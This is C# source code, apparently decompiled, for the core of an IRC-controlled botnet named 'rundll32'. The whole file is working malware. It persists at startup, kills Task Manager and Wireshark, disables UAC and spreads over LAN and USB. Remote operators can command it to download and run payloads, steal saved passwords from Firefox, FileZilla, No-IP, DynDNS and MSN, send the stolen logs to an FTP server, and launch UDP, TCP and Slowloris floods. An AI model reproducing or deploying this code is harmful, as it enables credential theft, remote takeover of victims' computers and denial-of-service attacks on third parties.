using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Windows.Forms;
using rundll32.bruteforce;
using rundll32.encryption;
using rundll32.floods;
using rundll32.spreaders;
using rundll32.stealers;

namespace rundll32;

internal static class Program
{
	private static Thread mutexThread;

	private static Thread antiProcThread = new Thread(antiProcLoop);

	public static bool firstRun = false;

	public static bool usbRun = false;

	private static irc _irc;

	private static bool connected = false;

	private static bool anticlone = false;

	public static List<ircUser> loggedInUsers = new List<ircUser>();

	private static void mutexLoop()
	{
		Mutex mutex = new Mutex(initiallyOwned: false, config.mutex);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Process.GetCurrentProcess().Kill();
		}
		while (true)
		{
			Thread.Sleep(1000);
		}
	}

	private static void antiProcLoop()
	{
		try
		{
			if (Process.GetCurrentProcess().MainModule!.FileName!.ToLower().Contains("sample"))
			{
				Process.GetCurrentProcess().Kill();
			}
		}
		catch
		{
		}
		while (true)
		{
			try
			{
				while (true)
				{
					Process[] processes = Process.GetProcesses();
					foreach (Process process in processes)
					{
						if (process.ProcessName.Contains("taskmgr"))
						{
							process.Kill();
						}
						if (process.ProcessName.Contains("wireshark"))
						{
							process.Kill();
						}
					}
					Thread.Sleep(10);
				}
			}
			catch
			{
			}
		}
	}

	[STAThread]
	private static void Main(string[] args)
	{
		try
		{
			if (args[0].Contains("usb"))
			{
				usbRun = true;
			}
			if (args[0].Contains("new"))
			{
				firstRun = true;
			}
		}
		catch
		{
		}
		misc.copyToStartup(config.dirs, config.names);
		mutexThread = new Thread(mutexLoop);
		mutexThread.Start();
		antiProcThread.Start();
		antis.Check();
		config.loadVars();
		loggedInUsers.Add(new ircUser(null, "127.0.0.1", "Topic", "Topic"));
		connect();
		while (!connected)
		{
			Thread.Sleep(500);
		}
		usblistener.start(_irc);
		misc.disableUAC();
		if (firstRun)
		{
			lan.spread(Application.get_ExecutablePath(), _irc);
		}
	}

	private static void connect()
	{
		string newValue = new Random().Next(10000, 99999).ToString();
		_irc = new irc(new ircConnectionDetails(config.host, config.port), new ircUser(null, config.nick.Replace("%rand%", newValue), config.user.Replace("%rand%", newValue)));
		_irc.onConnection += _irc_onConnection;
		_irc.onMessageReceived += _irc_onMessageReceived;
		_irc.connect();
	}

	public static void _irc_onConnection(irc irc)
	{
		connected = true;
		string[][] onConnChannels = config.onConnChannels;
		foreach (string[] array in onConnChannels)
		{
			irc.sendJoin(array[0], array[1]);
		}
		if (firstRun)
		{
			string[][] onNewInfectionChannels = config.onNewInfectionChannels;
			foreach (string[] array2 in onNewInfectionChannels)
			{
				irc.sendJoin(array2[0], array2[1]);
			}
		}
		if (usbRun)
		{
			string[][] onUsbInfectionChannels = config.onUsbInfectionChannels;
			foreach (string[] array3 in onUsbInfectionChannels)
			{
				irc.sendJoin(array3[0], array3[1]);
			}
		}
	}

	public static bool isLoggedIn(ircUser u)
	{
		return loggedInUsers.Contains(u);
	}

	public static void _irc_onMessageReceived(irc irc, ircMessage msg)
	{
		functionResponse functionResponse2 = functionParser.parse(msg);
		if (functionResponse2 == null)
		{
			return;
		}
		string text2;
		if (isLoggedIn(msg.user))
		{
			switch (functionResponse2.Name.ToLower())
			{
			case "say":
				if (functionResponse2.Arguments.Length == 1)
				{
					irc.sendMessage(msg.channel, functionResponse2.Arguments[0].Value.ToString());
				}
				break;
			case "kill":
				if (functionResponse2.Arguments.Length == 0)
				{
					irc.sendQuit("Killed by: " + msg.user.nick);
					Thread.Sleep(500);
					Process.GetCurrentProcess().Kill();
				}
				else if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					irc.sendQuit("Killed by: " + msg.user.nick + " Reason: " + functionResponse2.Arguments[0].Value);
					Thread.Sleep(500);
					Process.GetCurrentProcess().Kill();
				}
				break;
			case "dl":
				if (functionResponse2.Arguments.Length == 3)
				{
					if ((object)functionResponse2.Arguments[0].Type != typeof(string) || (object)functionResponse2.Arguments[1].Type != typeof(string) || (object)functionResponse2.Arguments[2].Type != typeof(bool))
					{
						break;
					}
					try
					{
						misc.download((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value, (bool)functionResponse2.Arguments[2].Value);
						if ((bool)functionResponse2.Arguments[2].Value)
						{
							irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded & executed successfully!");
						}
						else
						{
							irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded successfully!");
						}
						break;
					}
					catch (Exception ex3)
					{
						irc.sendMessage(msg.channel, ".:Download:. - \u000304Error thrown: " + ex3.GetType().ToString());
						break;
					}
				}
				if (functionResponse2.Arguments.Length == 2 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string))
				{
					try
					{
						misc.download((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value, execute: true);
						irc.sendMessage(msg.channel, ".:Download:. - \u000309Downloaded & executed successfully!");
						break;
					}
					catch (Exception ex4)
					{
						irc.sendMessage(msg.channel, ".:Download:. - \u000304Error thrown: " + ex4.GetType().ToString());
						break;
					}
				}
				break;
			case "encdl":
				if (functionResponse2.Arguments.Length == 3)
				{
					if ((object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string) && (object)functionResponse2.Arguments[2].Type == typeof(string))
					{
						try
						{
							misc.download(sll.decrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[2].Value), (string)functionResponse2.Arguments[1].Value, execute: true);
							irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded & executed successfully!");
							break;
						}
						catch (Exception ex)
						{
							irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000304Error thrown: " + ex.GetType().ToString());
							break;
						}
					}
				}
				else
				{
					if (functionResponse2.Arguments.Length != 4 || (object)functionResponse2.Arguments[0].Type != typeof(string) || (object)functionResponse2.Arguments[1].Type != typeof(string) || (object)functionResponse2.Arguments[2].Type != typeof(string) || (object)functionResponse2.Arguments[3].Type != typeof(bool))
					{
						break;
					}
					try
					{
						misc.download(sll.decrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[2].Value), (string)functionResponse2.Arguments[1].Value, (bool)functionResponse2.Arguments[3].Value);
						if ((bool)functionResponse2.Arguments[3].Value)
						{
							irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded & executed successfully!");
						}
						else
						{
							irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000309Downloaded successfully!");
						}
						break;
					}
					catch (Exception ex2)
					{
						irc.sendMessage(msg.channel, ".:Encrypted Download:. - \u000304Error thrown: " + ex2.GetType().ToString());
						break;
					}
				}
				break;
			case "updt":
				if (functionResponse2.Arguments.Length == 2 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string) && (string)functionResponse2.Arguments[1].Value == config.updatePwd)
				{
					try
					{
						misc.download((string)functionResponse2.Arguments[0].Value, new Random().Next(1000, 99990) + ".exe", execute: true);
						misc.remove(config.dirs, config.names);
						irc.sendMessage(msg.channel, ".:Update:. - \u000309Updated successfully!");
						irc.sendQuit("Updated by: " + msg.user.nick);
						Thread.Sleep(500);
						Process.GetCurrentProcess().Kill();
						break;
					}
					catch (Exception ex6)
					{
						irc.sendMessage(msg.channel, ".:Update:. - \u000304Error thrown: " + ex6.GetType().ToString());
						break;
					}
				}
				break;
			case "encupdt":
				if (functionResponse2.Arguments.Length == 3 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string) && (object)functionResponse2.Arguments[2].Type == typeof(string) && (string)functionResponse2.Arguments[1].Value == config.updatePwd)
				{
					try
					{
						misc.download(sll.decrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[2].Value), new Random().Next(1000, 99990) + ".exe", execute: true);
						misc.remove(config.dirs, config.names);
						irc.sendMessage(msg.channel, ".:Encrypted Update:. - \u000309Updated successfully!");
						irc.sendQuit("Updated by: " + msg.user.nick);
						Thread.Sleep(500);
						Process.GetCurrentProcess().Kill();
						break;
					}
					catch (Exception ex5)
					{
						irc.sendMessage(msg.channel, ".:Encrypted Update:. - \u000304Error thrown: " + ex5.GetType().ToString());
						break;
					}
				}
				break;
			case "rem":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string) && ((string)functionResponse2.Arguments[0].Value).Equals(config.remPwd))
				{
					misc.remove(config.dirs, config.names);
					irc.sendMessage(msg.channel, ".:Remove:. - \u000313Remove Successfull!");
					irc.sendQuit("Removed by: " + msg.user.nick);
					Thread.Sleep(500);
					Process.GetCurrentProcess().Kill();
				}
				break;
			case "xor.enc":
				if (functionResponse2.Arguments.Length == 2)
				{
					irc.sendNotice(msg.user.nick, xor.encrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value));
				}
				break;
			case "xor.dec":
				if (functionResponse2.Arguments.Length == 2)
				{
					irc.sendNotice(msg.user.nick, xor.decrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value));
				}
				break;
			case "sll.enc":
				if (functionResponse2.Arguments.Length == 2)
				{
					irc.sendNotice(msg.user.nick, sll.encrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value));
				}
				break;
			case "sll.dec":
				if (functionResponse2.Arguments.Length == 2)
				{
					irc.sendNotice(msg.user.nick, sll.decrypt((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value));
				}
				break;
			case "md5.start":
				if (functionResponse2.Arguments.Length == 4 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string) && (object)functionResponse2.Arguments[2].Type == typeof(int) && (object)functionResponse2.Arguments[3].Type == typeof(int))
				{
					md5.start(irc, msg.channel, (string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value, (int)functionResponse2.Arguments[2].Value, (int)functionResponse2.Arguments[3].Value);
				}
				break;
			case "md5.stop":
				if (functionResponse2.Arguments.Length == 0)
				{
					md5.stop(irc, msg.channel);
				}
				break;
			case "join":
				if (functionResponse2.Arguments.Length == 1)
				{
					if ((object)functionResponse2.Arguments[0].Type == typeof(string))
					{
						irc.sendJoin((string)functionResponse2.Arguments[0].Value);
					}
				}
				else if (functionResponse2.Arguments.Length == 2 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					irc.sendJoin((string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value);
				}
				break;
			case "part":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					irc.sendPart((string)functionResponse2.Arguments[0].Value);
				}
				break;
			case "raw":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					irc.send((string)functionResponse2.Arguments[0].Value);
				}
				break;
			case "ff":
				if (functionResponse2.Arguments.Length != 0)
				{
					break;
				}
				try
				{
					ff.ffEntry[] array = ff.steal();
					for (int i = 0; i < array.Length; i++)
					{
						ff.ffEntry ffEntry = array[i];
						irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry.host + "\u000310 User: \u000311" + ffEntry.user + "\u000310 Pass: \u000311" + ffEntry.pass);
					}
					break;
				}
				catch
				{
					break;
				}
			case "ff.search":
				if (functionResponse2.Arguments.Length != 1 || (object)functionResponse2.Arguments[0].Type != typeof(string))
				{
					break;
				}
				try
				{
					ff.ffEntry[] array5 = ff.steal();
					for (int m = 0; m < array5.Length; m++)
					{
						ff.ffEntry ffEntry4 = array5[m];
						if (ffEntry4.host.Contains((string)functionResponse2.Arguments[0].Value))
						{
							irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry4.host + "\u000310 User: \u000311" + ffEntry4.user + "\u000310 Pass: \u000311" + ffEntry4.pass);
						}
					}
					break;
				}
				catch
				{
					break;
				}
			case "fz":
				if (functionResponse2.Arguments.Length != 0)
				{
					break;
				}
				try
				{
					fz.fzEntry[] array4 = fz.steal();
					for (int l = 0; l < array4.Length; l++)
					{
						fz.fzEntry fzEntry3 = array4[l];
						irc.sendMessage(msg.channel, ".:FileZilla:. - \u000310Host: \u000311" + fzEntry3.host + "\u000310 User: \u000311" + fzEntry3.user + "\u000310 Pass: \u000311" + fzEntry3.pass);
					}
					break;
				}
				catch
				{
					break;
				}
			case "noip":
				if (functionResponse2.Arguments.Length == 0)
				{
					try
					{
						noip.acount acount9 = noip.steal();
						irc.sendMessage(msg.channel, ".:No-Ip:. - \u000310 User: \u000311" + acount9.user + "\u000310 Pass: \u000311" + acount9.pass);
						break;
					}
					catch
					{
						break;
					}
				}
				break;
			case "dyndns":
				if (functionResponse2.Arguments.Length == 0)
				{
					try
					{
						dyndns.acount acount8 = dyndns.steal();
						irc.sendMessage(msg.channel, ".:DynDns:. - \u000310 User: \u000311" + acount8.user + "\u000310 Pass: \u000311" + acount8.pass);
						break;
					}
					catch
					{
						break;
					}
				}
				break;
			case "msn":
				if (functionResponse2.Arguments.Length != 0)
				{
					break;
				}
				try
				{
					msn.acount acount4 = msn.steal();
					if (acount4.pass.Length < 3)
					{
						throw new Exception();
					}
					irc.sendMessage(msg.channel, ".:MSN:. - \u000310 User: \u000311" + acount4.user + "\u000310 Pass: \u000311" + acount4.pass);
					break;
				}
				catch
				{
					break;
				}
			case "steal":
				if (functionResponse2.Arguments.Length != 0)
				{
					break;
				}
				try
				{
					ff.ffEntry[] array2 = ff.steal();
					for (int j = 0; j < array2.Length; j++)
					{
						ff.ffEntry ffEntry2 = array2[j];
						irc.sendMessage(msg.channel, ".:Firefox:. - \u000310Host: \u000311" + ffEntry2.host + "\u000310 User: \u000311" + ffEntry2.user + "\u000310 Pass: \u000311" + ffEntry2.pass);
					}
				}
				catch
				{
				}
				try
				{
					fz.fzEntry[] array3 = fz.steal();
					for (int k = 0; k < array3.Length; k++)
					{
						fz.fzEntry fzEntry = array3[k];
						irc.sendMessage(msg.channel, ".:FileZilla:. - \u000310Host: \u000311" + fzEntry.host + "\u000310 User: \u000311" + fzEntry.user + "\u000310 Pass: \u000311" + fzEntry.pass);
					}
				}
				catch
				{
				}
				try
				{
					noip.acount acount = noip.steal();
					irc.sendMessage(msg.channel, ".:No-Ip:. - \u000310 User: \u000311" + acount.user + "\u000310 Pass: \u000311" + acount.pass);
				}
				catch
				{
				}
				try
				{
					dyndns.acount acount2 = dyndns.steal();
					irc.sendMessage(msg.channel, ".:DynDns:. - \u000310 User: \u000311" + acount2.user + "\u000310 Pass: \u000311" + acount2.pass);
				}
				catch
				{
				}
				try
				{
					msn.acount acount3 = msn.steal();
					if (acount3.pass.Length < 3)
					{
						throw new Exception();
					}
					irc.sendMessage(msg.channel, ".:MSN:. - \u000310 User: \u000311" + acount3.user + "\u000310 Pass: \u000311" + acount3.pass);
					break;
				}
				catch
				{
					break;
				}
			case "steal.log":
			{
				string host = config.ftp_host;
				int port = config.ftp_port;
				string user = config.ftp_user;
				string pass = config.ftp_pass;
				string path = config.ftp_path;
				bool flag = false;
				if (functionResponse2.Arguments.Length == 0)
				{
					flag = true;
				}
				if (functionResponse2.Arguments.Length == 5 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(int) && (object)functionResponse2.Arguments[2].Type == typeof(string) && (object)functionResponse2.Arguments[3].Type == typeof(string) && (object)functionResponse2.Arguments[4].Type == typeof(string))
				{
					host = (string)functionResponse2.Arguments[0].Value;
					port = (int)functionResponse2.Arguments[1].Value;
					user = (string)functionResponse2.Arguments[2].Value;
					pass = (string)functionResponse2.Arguments[3].Value;
					path = (string)functionResponse2.Arguments[4].Value;
					flag = true;
				}
				if (!flag)
				{
					break;
				}
				string text = "";
				text += "==============================\r\n";
				try
				{
					ff.ffEntry[] array = ff.steal();
					for (int i = 0; i < array.Length; i++)
					{
						ff.ffEntry ffEntry3 = array[i];
						text += "Type: Firefox\r\n";
						text = text + "Host: " + ffEntry3.host + "\r\n";
						text = text + "User: " + ffEntry3.user + "\r\n";
						text = text + "Pass: " + ffEntry3.pass + "\r\n";
						text += "==============================\r\n";
					}
				}
				catch
				{
				}
				try
				{
					fz.fzEntry[] array4 = fz.steal();
					for (int i = 0; i < array4.Length; i++)
					{
						fz.fzEntry fzEntry2 = array4[i];
						text += "Type: FileZilla\r\n";
						text = text + "Host: " + fzEntry2.host + "\r\n";
						text = text + "User: " + fzEntry2.user + "\r\n";
						text = text + "Pass: " + fzEntry2.pass + "\r\n";
						text += "==============================\r\n";
					}
				}
				catch
				{
				}
				try
				{
					noip.acount acount5 = noip.steal();
					text += "Type: No-Ip\r\n";
					text = text + "User: " + acount5.user + "\r\n";
					text = text + "Pass: " + acount5.pass + "\r\n";
					text += "==============================\r\n";
				}
				catch
				{
				}
				try
				{
					dyndns.acount acount6 = dyndns.steal();
					text += "Type: DynDNS\r\n";
					text = text + "User: " + acount6.user + "\r\n";
					text = text + "Pass: " + acount6.pass + "\r\n";
					text += "==============================\r\n";
				}
				catch
				{
				}
				try
				{
					msn.acount acount7 = msn.steal();
					if (acount7.pass.Length < 3)
					{
						throw new Exception();
					}
					text += "Type: MSN\r\n";
					text = text + "User: " + acount7.user + "\r\n";
					text = text + "Pass: " + acount7.pass + "\r\n";
					text += "==============================\r\n";
				}
				catch
				{
				}
				if (!(text != "==============================\r\n"))
				{
					break;
				}
				try
				{
					ftp ftp2 = new ftp(host, port, user, pass);
					ftp2.connect();
					Thread.Sleep(250);
					ftp2.changeDir(path);
					Thread.Sleep(250);
					ftp2.writeFile(misc.GetVolumeSerial("c") + ".txt", text);
					Thread.Sleep(250);
					while (ftp2._data.Connected)
					{
					}
					ftp2.close();
					irc.sendMessage(msg.channel, ".:Steal:. - \u000309Logged successfully to ftp!");
					break;
				}
				catch
				{
					break;
				}
			}
			case "udp.start":
				if (functionResponse2.Arguments.Length == 5 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(int) && (object)functionResponse2.Arguments[2].Type == typeof(int) && (object)functionResponse2.Arguments[3].Type == typeof(int) && (object)functionResponse2.Arguments[4].Type == typeof(int) && udp.start((string)functionResponse2.Arguments[0].Value, (int)functionResponse2.Arguments[1].Value, (int)functionResponse2.Arguments[2].Value, (int)functionResponse2.Arguments[3].Value, (int)functionResponse2.Arguments[4].Value))
				{
					irc.sendMessage(msg.channel, ".:UDP:. - \u000304Flooding started on \u000307" + (string)functionResponse2.Arguments[0].Value + ":" + functionResponse2.Arguments[1].Value.ToString() + "\u000304!");
				}
				break;
			case "udp.stop":
				if (functionResponse2.Arguments.Length == 0)
				{
					try
					{
						long bytes = udp.stop();
						irc.sendMessage(msg.channel, ".:UDP:. - \u000304Stopped flooding (\u000307 " + misc.FormatBytes(bytes) + "/s\u000304 average)!");
						break;
					}
					catch
					{
						break;
					}
				}
				break;
			case "tcp.start":
				if (functionResponse2.Arguments.Length == 4 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(int) && (object)functionResponse2.Arguments[2].Type == typeof(int) && (object)functionResponse2.Arguments[3].Type == typeof(int) && tcp.start((string)functionResponse2.Arguments[0].Value, (int)functionResponse2.Arguments[1].Value, (int)functionResponse2.Arguments[2].Value, (int)functionResponse2.Arguments[3].Value))
				{
					irc.sendMessage(msg.channel, ".:TCP:. - \u000304Flooding started on \u000307" + (string)functionResponse2.Arguments[0].Value + ":" + functionResponse2.Arguments[1].Value.ToString() + "\u000304!");
				}
				break;
			case "tcp.stop":
				if (functionResponse2.Arguments.Length == 0 && tcp.stop())
				{
					irc.sendMessage(msg.channel, ".:TCP:. - \u000304Stopped flooding!");
				}
				break;
			case "sls.start":
				if (functionResponse2.Arguments.Length == 3 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(int) && (object)functionResponse2.Arguments[2].Type == typeof(int) && sls.start((string)functionResponse2.Arguments[0].Value, (int)functionResponse2.Arguments[1].Value, (int)functionResponse2.Arguments[2].Value))
				{
					irc.sendMessage(msg.channel, ".:SLS:. - \u000304Flooding started on \u000307" + (string)functionResponse2.Arguments[0].Value + "\u000304!");
				}
				break;
			case "sls.stop":
				if (functionResponse2.Arguments.Length == 0 && sls.stop())
				{
					irc.sendMessage(msg.channel, ".:SLS:. - \u000304Stopped flooding!");
				}
				break;
			case "torr":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					torrent.seed(irc, (string)functionResponse2.Arguments[0].Value);
				}
				break;
			case "msn.msg":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					im.msn.sendMsg(irc, (string)functionResponse2.Arguments[0].Value);
				}
				break;
			case "msn.file":
				if (functionResponse2.Arguments.Length == 2 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string))
				{
					im.msn.sendFile(irc, (string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value);
				}
				break;
			case "msn.zip":
				if (functionResponse2.Arguments.Length == 3 && (object)functionResponse2.Arguments[0].Type == typeof(string) && (object)functionResponse2.Arguments[1].Type == typeof(string) && (object)functionResponse2.Arguments[2].Type == typeof(string))
				{
					im.msn.sendZipFile(irc, (string)functionResponse2.Arguments[0].Value, (string)functionResponse2.Arguments[1].Value, (string)functionResponse2.Arguments[2].Value);
				}
				break;
			case "aim.msg":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					im.aim.sendMsg(irc, (string)functionResponse2.Arguments[0].Value);
				}
				break;
			case "vis":
				if (functionResponse2.Arguments.Length == 1 && (object)functionResponse2.Arguments[0].Type == typeof(string))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = (string)functionResponse2.Arguments[0].Value;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					Process.Start(processStartInfo);
				}
				break;
			case "logout":
				if (functionResponse2.Arguments.Length == 0)
				{
					loggedInUsers.Remove(msg.user);
					irc.sendMessage(msg.channel, ".:Logout:. - \u000309Logged out successfully!");
				}
				break;
			}
		}
		else if ((text2 = functionResponse2.Name.ToLower()) != null && text2 == "login" && functionResponse2.Arguments.Length == 1)
		{
			if (functionResponse2.Arguments[0].Value.Equals(config.loginPwd) && (object)functionResponse2.Arguments[0].Type == typeof(string))
			{
				irc.sendMessage(msg.channel, ".:Login:. - \u000309Welcome, " + msg.user.nick);
				loggedInUsers.Add(msg.user);
			}
			else
			{
				irc.sendMessage(msg.channel, ".:Login:. - \u000304Access Denied, " + msg.user.nick);
			}
		}
	}
}
